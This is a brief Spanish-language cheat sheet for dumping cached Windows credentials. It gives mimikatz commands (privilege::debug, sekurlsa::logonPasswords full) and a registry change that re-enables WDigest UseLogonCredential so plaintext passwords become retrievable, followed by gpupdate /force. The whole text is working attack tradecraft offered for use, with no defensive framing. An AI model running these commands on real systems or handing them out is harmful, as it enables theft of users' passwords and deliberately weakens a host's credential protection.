## Solo va a funcionar si el user tiene permisos de debug o es un superusuario

### Dumpear credenciales en cache con mimikatz 
    mimikatz.exe

    privilege::debug


    sekurlsa::logonPasswords full


Hay veces en que el wdigest esté protegido y no permitirá dumpear los passwords en texto plano. Para desprotegerlo (si tenemos permisos de admin):
##### cmd:


    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

##### Luego:
    gpupdate /force

intentamos nuevamente y tendrían que aparecer 
